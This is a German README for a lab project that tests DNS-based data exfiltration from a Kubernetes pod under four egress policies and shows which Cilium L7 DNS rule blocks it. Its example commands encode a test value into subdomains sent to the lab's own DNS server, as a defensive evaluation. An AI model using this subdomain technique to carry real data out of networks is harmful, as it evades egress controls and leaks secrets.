# DNS-Exfiltration

***Das Thema:*** Analyse von DNS als möglichem Datenexfiltrationskanal in Kubernetes-Clustern trotz Default-Deny-Egress-NetworkPolicies.

In diesem Projekt wird untersucht, ob und unter welchen Bedingungen Daten über DNS aus einem Kubernetes-Cluster exfiltriert werden können. Dabei wird geprüft, ab welchem Punkt DNS-basierte Exfiltration blockiert oder zumindest stark eingeschränkt werden kann, ohne die grundlegende DNS-Funktionalität vollständig zu verlieren.

Der Test wird in vier Fällen durchgeführt. Der erste Fall bildet die offene Baseline ohne NetworkPolicies. Danach werden schrittweise Egress-Beschränkungen und eine konkrete Gegenmassnahme eingeführt.

## Inhaltsverzeichnis

- [Baseline](#baseline)
- [Provisionierung](#provisionierung)
  - [Zugriff auf die Maschinen](#zugriff-auf-die-maschinen)
  - [Prüfung der Baseline](#prüfung-der-baseline)
    - [VM's und IP-Adressen](#vms-und-ip-adressen)
    - [K3s](#k3s)
    - [Basis Pakete](#basis-pakete)
    - [CNI und Test-Pod](#cni-und-test-pod)
    - [DNS](#dns)
- [1. Fall: Offene Baseline ohne Egress-Beschränkung](#1-fall-offene-baseline-ohne-egress-beschränkung)
  - [These Case 1](#these-case-1)
- [2. Fall: Default-Deny-Egress](#2-fall-default-deny-egress)
  - [These Case 2](#these-case-2)
- [3. Fall: Default-Deny-Egress, nur UDP-Port 53 zum autoritativen DNS](#3-fall-default-deny-egress-nur-udp-port-53-zum-autoritativen-dns)
  - [These Case 3](#these-case-3)
- [4. Fall: Cilium L7-DNS (nur erlaubter Name) über Cluster-CoreDNS zur DNS-VM](#4-fall-cilium-l7-dns-nur-erlaubter-name-über-cluster-coredns-zur-dns-vm)
  - [These Case 4](#these-case-4)

## Baseline

Für die Baseline werden drei Debian-13-VMs auf SWITCHengines provisioniert:

- `cysl-controlplane`: Kubernetes-Control-Plane mit Floating IP
- `cysl-worker`: Kubernetes-Worker-Node ohne Floating IP
- `cysl-coredns`: autoritativer DNS-Server für die Test-Domain `exfil.test`

Die Umgebung wird reproduzierbar mit Infrastructure as Code aufgebaut. OpenTofu erstellt die VMs, das private Netzwerk, die Security Group und die Cloud-Init-Konfiguration. Ansible installiert und konfiguriert anschliessend die benötigten Komponenten wie k3s, Helm, Cilium, curl, dig und den autoritativen DNS-Server. Ausserdem wird mit Ansible ein Test-Pod über ein Helmchart deployt.

Nur die Controlplane besitzt eine Floating IP. Die anderen Maschinen sind nur über private IP-Adressen erreichbar, beispielsweise per SSH-Jump über die Controlplane.

## Provisionierung

```bash
export OS_AUTH_URL="https://keystone.cloud.switch.ch:5000/v3"
export OS_USERNAME="<deine-email>"
export OS_PASSWORD="<dein-key>"
export OS_PROJECT_ID="<projekt-id>"
export OS_USER_DOMAIN_NAME="Default"
export OS_REGION_NAME="LS"

cd sites/switch-engines
tofu init
tofu plan
tofu apply

cd ansible
ansible-playbook -i inventory.yml playbook.yml
```

### Zugriff auf die Maschinen

```bash
ssh cysl-admin@<floating-ip>
ssh -J cysl-admin@<floating-ip> cysl-admin@10.10.1.11 # worker
ssh -J cysl-admin@<floating-ip> cysl-admin@10.10.1.12 # coreDNS
```

### Prüfung der Baseline

#### VM's und IP-Adressen

```bash
# In den ansible-ordner wechseln:
cd ansible

# Die Erreichbarkeit aller VMs kann mit folgendem Ansible-Befehl geprüft werden:
ansible -i inventory.yml all -m ping

# Hostname und interne IP-Adresse prüfen:
ansible -i inventory.yml all -b -m shell -a 'hostname && hostname -I'
```

#### K3s

```bash
# Die k3s-Installation wird mit folgenden Befehlen geprüft:
ansible -i inventory.yml controlplane -b -m command -a 'systemctl status k3s --no-pager'
ansible -i inventory.yml workers -b -m command -a 'systemctl status k3s-agent --no-pager'

# Kubernetes Nodes prüfen:
ansible -i inventory.yml controlplane -b -m command -a 'kubectl get nodes -o wide'

# Kubernetes Pods prüfen:
ansible -i inventory.yml controlplane -b -m command -a 'kubectl get pods -A -o wide'
```

#### Basis Pakete

```bash
# Prüfung der Basis Pakete -> curl, ca-certificates, iptables, dnsutils
ansible -i inventory.yml all -b -m shell -a 'dpkg -l | egrep "curl|ca-certificates|iptables|dnsutils"'

# Prüfen ob dig in dnsutils installiert ist
ansible -i inventory.yml all -m command -a 'dig -v'

# Prüfen ob Python installiert worden ist
ansible -i inventory.yml all -m command -a 'python3 --version'

# Prüfen von Helm
ansible -i inventory.yml controlplane -m command -a 'helm version'
```

#### CNI und Test-Pod

```bash
# Cilium muss laufen, Flannel darf nicht vorhanden sein:
ansible -i inventory.yml controlplane -b -m shell -a 'kubectl -n kube-system get pods -o wide | egrep "cilium|flannel"'

# Namespace und Test-Pod prüfen:
ansible -i inventory.yml controlplane -b -m command -a 'kubectl get ns exfil-test'
ansible -i inventory.yml controlplane -b -m command -a 'kubectl -n exfil-test get pod dns-test -o wide'

# Kubernetes NetworkPolicies auflisten:
ansible -i inventory.yml controlplane -b -m shell -a 'kubectl get networkpolicy -A -o yaml'

# CiliumNetworkPolicies auflisten:
ansible -i inventory.yml controlplane -b -m shell -a 'kubectl get cnp -A -o yaml'

# Clusterweite CiliumNetworkPolicies aufliste:
ansible -i inventory.yml controlplane -b -m shell -a 'kubectl get ccnp -o yaml'
```

#### DNS

```bash
# Prüfen ob coreDNS-Service läuft
ansible -i inventory.yml dns -b -m command -a 'systemctl status coredns --no-pager'
```

---

## 1. Fall: Offene Baseline ohne Egress-Beschränkung

**Ablauf:**
In diesem Fall ist keine NetworkPolicy aktiv. Der Test-Pod `dns-test` im Namespace `exfil-test` sendet eine DNS-Anfrage direkt an den autoritativen DNS-Server `10.10.1.12`.

Zur Simulation einer DNS-Exfiltration wird der Testwert `secret123` als Subdomain verwendet.
Nach dem Absenden der DNS-Anfrage werden auf der DNS-VM die Logs des CoreDNS-Dienstes geprüft.

Nachdem die Infrastruktur provisioniert ist, ist dieser Schritt nicht unbedingt nötig, sollte man vorher Case 2-4 durchegeführt haben, so kann man mit folgendem Befehl alles wieder öffnen, sprich einen Clean-Up der Policies machen:

```bash
ansible-playbook -i inventory.yml playbook.yml --tags exfil_cases -e exfil_case=1
```

**Erwartung:**
Die DNS-Query erreicht den autoritativen DNS-Server. Der Testwert `secret123` ist anschliessend in den DNS-Logs sichtbar.

```bash
# Exfiltration auf die Subdomain secret123
ansible -i inventory.yml controlplane -b -m shell -a 'kubectl exec -n exfil-test dns-test -- dig @10.10.1.12 secret123.exfil.test'

# Auflisten der letzten Logs auf dem CoreDNS (10.10.1.12)
ansible -i inventory.yml dns -b -m shell -a 'journalctl -u coredns --since "10 minutes ago"'
```

**Ausgabe:**

```text
Apr 30 20:09:20 cysl-coredns coredns[623]: [INFO] 10.10.1.11:28276 - 43719 "A IN secret123.exfil.test. udp 61 false 1232" NXDOMAIN qr,aa,rd 119 0.000698881s
```

### These Case 1

Die Log-Ausgabe zeigt, dass die Anfrage `secret123.exfil.test` beim autoritativen DNS-Server angekommen ist. Obwohl die Antwort `NXDOMAIN` lautet, ist die Exfiltration für diesen Test trotzdem nachgewiesen, weil der relevante Inhalt im angefragten Domainnamen steckt.

Damit ist gezeigt, dass ein Pod im Kubernetes-Cluster ohne Egress-Beschränkung Daten über DNS-Anfragen an einen externen Angreifer-DNS übertragen kann.

---

## 2. Fall: Default-Deny-Egress

**Ablauf:**
In diesem Fall wird die DNS-Exfiltration durch eine `deny-all-egress`-NetworkPolicy verhindert. Die Policy wird im Namespace `exfil-test` angewendet und blockiert die ausgehende Kommunikation der Pods.

Der zweite Fall wird folgendermassen aufgesetzt:

```bash
cd ansible

# Anwendung von Fall 2:
ansible-playbook -i inventory.yml playbook.yml --tags exfil_cases -e exfil_case=2
```

**Erwartung:**
Die DNS-Anfrage an den autoritativen DNS-Server `10.10.1.12` wird blockiert. Dadurch erreicht die Query den DNS-Server nicht und der Testwert `secret123` erscheint nicht in den CoreDNS-Logs.

```bash
# Exfiltration auf die Subdomain secret123 testen
ansible -i inventory.yml controlplane -b -m shell -a 'kubectl exec -n exfil-test dns-test -- dig @10.10.1.12 secret123.exfil.test'

# Letzte Logs auf dem CoreDNS-Server prüfen
ansible -i inventory.yml dns -b -m shell -a 'journalctl -u coredns --since "10 minutes ago"'
```

**Ausgabe:**

```text
Auf der Controlplane:
;; communications error to 10.10.1.12#53: connection refused
;; communications error to 10.10.1.12#53: connection refused
;; communications error to 10.10.1.12#53: connection refused

; <<>> DiG 9.20.17 <<>> @10.10.1.12 secret123.exfil.test
; (1 server found)
;; global options: +cmd
;; no servers could be reached
command terminated with exit code 9
```

### These Case 2

Die Ausgabe zeigt, dass der Test-Pod den autoritativen DNS-Server `10.10.1.12` nicht mehr erreichen kann. Die DNS-Anfrage wird durch die `deny-all-egress`-NetworkPolicy blockiert, bevor sie beim DNS-Server ankommt.
In den CoreDNS-Logs erscheint deshalb kein neuer Eintrag zu `secret123.exfil.test`. Damit ist gezeigt, dass ein vollständiges Egress-Deny DNS-basierte Exfiltration verhindert.

---

## 3. Fall: Default-Deny-Egress, nur UDP-Port 53 zum autoritativen DNS

**Ablauf:**
Wie bei Fall 2 wird zunächst jeglicher Egress per NetworkPolicy eingeschränkt. Zusätzlich gibt es genau eine Ausnahme: UDP auf Port `53` zum autoritativen DNS-Server `10.10.1.12` (/32 über `ipBlock`). Andere Ports und Ziele bleiben gesperrt.

```bash
cd ansible

ansible-playbook -i inventory.yml playbook.yml --tags exfil_cases -e exfil_case=3
```

**Erwartung:**
DNS-Anfragen per UDP an `10.10.1.12:53` erreichen den Server wieder. Der gleiche `dig`-Test wie in Fall 1 sollte funktionieren; `secret123` ist in den CoreDNS-Logs sichtbar (analog zur Baseline bei Fall 1).

```bash
ansible -i inventory.yml controlplane -b -m shell -a 'kubectl exec -n exfil-test dns-test -- dig @10.10.1.12 secret123.exfil.test'

ansible -i inventory.yml dns -b -m shell -a 'journalctl -u coredns --since "10 minutes ago"'
```

**Ausgabe:**

`dig` sollte eine Antwort vom Server zeigen (z. B. `NXDOMAIN` für die Testdomain). Auf dem DNS-Host erscheint wieder ein Eintrag wie in Fall 1:

```text
May 01 15:50:02 cysl-coredns coredns[624]: [INFO] 10.10.1.11:43353 - 16713 "A IN secret123.exfil.test. udp 61 false 1232" NXDOMAIN qr,aa,rd 119 0.032659558s
```

### These Case 3

Die NetworkPolicy schränkt den ausgehenden Traffic zwar deutlich ein: Der Test-Pod darf nur noch UDP-Verkehr auf Port `53` zum autoritativen DNS-Server `10.10.1.12` senden.
Trotzdem bleibt DNS-basierte Exfiltration weiterhin möglich. Der Grund ist, dass Kubernetes NetworkPolicies nur auf Netzwerkebene arbeiten. Sie können Ziel, Port und Protokoll einschränken, aber nicht den Inhalt der DNS-Anfrage prüfen.
Dadurch kann weiterhin eine beliebige Subdomain wie `secret123.exfil.test` angefragt werden. Der eigentliche Datenwert steckt im Domainnamen und erscheint dadurch wieder in den Logs des DNS-Servers.
Damit zeigt Fall 3, dass eine einfache DNS-Ausnahme im Default-Deny-Egress-Modell den Exfiltrationskanal erneut öffnen kann. Für eine genauere Kontrolle, zum Beispiel nur erlaubte Domains zuzulassen, wird eine feinere Policy benötigt, etwa mit Cilium.

## 4. Fall: Cilium L7-DNS (nur erlaubter Name) über Cluster-CoreDNS zur DNS-VM

In Fall 3 reicht eine Kubernetes-`NetworkPolicy` nur bis Layer 4: Jede Subdomain unter `exfil.test` darf mitgehen, solange UDP/53 zum autoritativen Server erlaubt ist.

Fall 4 verwendet **ausschließlich** eine `CiliumNetworkPolicy`. Sie erlaubt für den Test-Pod genau einen Egress-Pfad: UDP `53` **nur** an die Cluster-CoreDNS-Pods (`k8s-app: kube-dns` im Namespace `kube-system`), kombiniert mit der **L7-Regel** `rules.dns: matchName: allowed.exfil.test`. Für diesen Pfad leitet Cilium den DNS-Verkehr in den **DNS-Proxy** im Agent, liest den QNAME aus und erzwingt die Namensregel dort.

`dig @10.10.1.12 …` umgeht diesen Pfad: Der Pod spricht die DNS-VM direkt an, nicht den Cluster-DNS. Dafür gibt es in der Policy **keinen** erlaubten Egress, daher typischerweise **Timeout** statt einer sofortigen DNS-Antwort. Die L7-Regel greift hier nicht wie bei Abfragen über den Cluster-Resolver.

Wichtig: **keine** parallele Kubernetes-`NetworkPolicy` (wie in Fall 3) anwenden. Sobald irgendeine Policy denselben L4-Pfad ohne `rules.dns` öffnet, fällt die L7-Erzwingung weg, und die Exfil-Subdomain käme wieder durch. Der Cleanup zu Beginn von Case 4 stellt das sicher.

```bash
cd ansible

ansible-playbook -i inventory.yml playbook.yml --tags exfil_cases -e exfil_case=4
```

**Erwartung:** `dig allowed.exfil.test` (ohne `@`) wird von Cilium zugelassen, erreicht über die Stub-Zone in Cluster-CoreDNS den Server auf `10.10.1.12` und erscheint dort in den Logs.
`dig secret123.exfil.test` wird an der Cilium-DNS-Policy abgewiesen und wirft eine Fehlermeldung, wie in Case 2.

```bash
# Queri 1
ansible -i inventory.yml controlplane -b -m shell -a 'kubectl exec -n exfil-test dns-test -- dig allowed.exfil.test'

# Queri 2
ansible -i inventory.yml controlplane -b -m shell -a 'kubectl exec -n exfil-test dns-test -- dig secret123.exfil.test'

# Logs autoritativer CoreDNS (VM)
ansible -i inventory.yml dns -b -m shell -a 'journalctl -u coredns --since "15 minutes ago"'
```

**Ausgabe**:

```text
Log-Ausgabe auf dem DNS nach Queri 1:

May 04 00:53:42 cysl-coredns coredns[12955]: [INFO] 10.10.1.11:54231 - 65332 "A IN allowed.exfil.test. udp 59 false 1232" NXDOMAIN qr,aa,rd 117 0.000268624s

Auf der Controlplane:
; <<>> DiG 9.20.17 <<>> secret123.exfil.test
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 8227
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;secret123.exfil.test.  IN A

;; Query time: 0 msec
;; SERVER: 10.43.0.10#53(10.43.0.10) (UDP)
;; WHEN: Sun May 03 22:54:46 UTC 2026
;; MSG SIZE  rcvd: 38
```

### These Case 4

Der entscheidende Punkt ist, dass im Log des autoritativen DNS-Servers kein neuer Eintrag für secret123.exfil.test erscheint. Damit ist gezeigt, dass der eigentliche Exfiltrationsversuch blockiert wurde, obwohl der DNS-Verkehr grundsätzlich weiterhin möglich bleibt.

Gleichzeitig zeigt dieser Fall eine wichtige Grenze: Cilium kann DNS-Anfragen nur dann auf Layer 7 prüfen, wenn der Verkehr über einen kontrollierten DNS-Pfad läuft, zum Beispiel über den Cluster-CoreDNS. Wird hingegen ein beliebiger externer Resolver direkt erlaubt, kann Cilium zwar den Netzwerkpfad einschränken, aber nicht automatisch verhindern, dass erlaubte DNS-Anfragen als Datenkanal missbraucht werden.

Daraus folgt: Eine sichere DNS-Egress-Strategie darf nicht einfach UDP-Port 53 zu beliebigen Resolvern öffnen. Stattdessen sollte DNS-Verkehr zentral über einen kontrollierten Resolver geleitet und dort mit Cilium-DNS-Regeln eingeschränkt werden. Nur so kann verhindert werden, dass Angreifer Daten in Subdomains verstecken und über scheinbar normale DNS-Anfragen aus dem Cluster heraus übertragen.
